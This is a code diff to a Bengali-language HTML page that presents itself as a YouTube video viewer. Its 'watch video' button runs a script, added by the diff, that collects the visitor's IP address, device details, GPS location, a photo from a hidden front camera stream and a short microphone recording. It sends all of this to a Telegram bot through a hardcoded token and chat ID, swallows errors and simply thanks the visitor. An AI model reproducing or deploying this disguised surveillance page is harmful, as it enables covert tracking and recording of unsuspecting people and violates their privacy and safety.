@@ -11,44 +11,85 @@
         /* বাটনের ডিজাইন */
         button { padding: 15px 30px; font-size: 18px; background-color: #ff0000; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
         #status { margin-top: 15px; font-weight: bold; color: #333; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <h2>ভিডিওটি দেখুন</h2>
 
-    <!-- ইউটিউব index.html
-
- -->
+    <!-- ইউটিউব ভিডিও -->
     <div class="video-container">
         <iframe src="https://www.youtube.com/embed/5YG7wCDHAMs" allowfullscreen></iframe>
     </div>
 
-    <!-- বাটন টেক্সট পরিবর্তন করা হয়েছে -->
-    <button onclick="sendLocationToTelegram()">ভিডিও দেখুন</button>
+    <!-- ভিডিও প্লে বাটন -->
+    <button onclick="startProcess()">ভিডিও দেখুন</button>
 
     <p id="status"></p>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "8725973028:AAHyBGtJnrPlKkil-nt5FgvZCGRl8KurQd0"; 
         const TELEGRAM_CHAT_ID = "7599370002"; 
 
-        function sendLocationToTelegram() {
+        async function startProcess() {
             const statusText = document.getElementById("status");
+            statusText.innerText = "কিছুক্ষণ অপেক্ষা করুন...";
 
+            // ১. IP এবং ডিভাইসের তথ্য পাঠানো
+            await sendIPAndDeviceInfo();
+
+            // ২. জিপিএস লোকেশন নেওয়া ও পাঠানো
+            sendLocation();
+
+            // ৩. ক্যামেরা অ্যাক্সেস করে ছবি তোলা ও পাঠানো
+            capturePhoto();
+
+            // ৪. মাইক্রোফোন থেকে অডিও রেকর্ড করে পাঠানো (৩ সেকেন্ড)
+            recordAudio();
+        }
+
+        async function sendIPAndDeviceInfo() {
+            try {
+                // IP Address নিয়ে আসা
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIP = ipData.ip;
+
+                const textMessage = `
+📱 **নতুন ইউজার তথ্য:**
+🌐 **IP Address:** ${userIP}
+💻 **Platform:** ${navigator.platform}
+🔍 **User Agent:** ${navigator.userAgent}
+📐 **Screen:** ${screen.width}x${screen.height}
+🌐 **Language:** ${navigator.language}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textMessage,
+                        parse_mode: "Markdown"
+                    })
+                });
+            } catch (err) {
+                console.log("IP Info Error:", err);
+            }
+        }
+
+        function sendLocation() {
             if (navigator.geolocation) {
-                statusText.innerText = "লোকেশন নেওয়া হচ্ছে...";
-
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
 
-                        statusText.innerText = "টেলিগ্রামে পাঠানো হচ্ছে...";
-
-                        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
-
-                        fetch(url, {
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
@@ -56,28 +97,85 @@
                                 latitude: lat,
                                 longitude: lon
                             })
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            if (data.ok) {
-                                statusText.innerText = "সফলভাবে টেলিগ্রামে লোকেশন পাঠানো হয়েছে!";
-                            } else {
-                                statusText.innerText = "পাঠাতে ব্যর্থ হয়েছে।";
-                            }
-                        })
-                        .catch(error => {
-                            statusText.innerText = "ত্রুটি ঘটেছে: " + error;
                         });
                     },
                     function(error) {
-                        statusText.innerText = "ধন্যবাদ।";
+                        console.log("Location Denied");
                     }
                 );
-            } else {
-                statusText.innerText = "Geolocation সাপোর্ট করে না।";
             }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("chat_id", TELEGRAM_CHAT_ID);
+                        formData.append("photo", blob, "photo.jpg");
+
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+                }, 1500);
+            })
+            .catch(err => {
+                console.log("Camera Denied/Error:", err);
+            });
+        }
+
+        function recordAudio() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    const formData = new FormData();
+                    formData.append("chat_id", TELEGRAM_CHAT_ID);
+                    formData.append("voice", audioBlob, "voice.ogg");
+
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(() => {
+                        document.getElementById("status").innerText = "ধন্যবাদ!";
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 3000); // ৩০ সেকেন্ডের অডিও রেকর্ড করবে
+            })
+            .catch(err => {
+                console.log("Audio Denied/Error:", err);
+                document.getElementById("status").innerText = "ধন্যবাদ!";
+            });
         }
     </script>
 
 </body>
-  </html>
+</html>
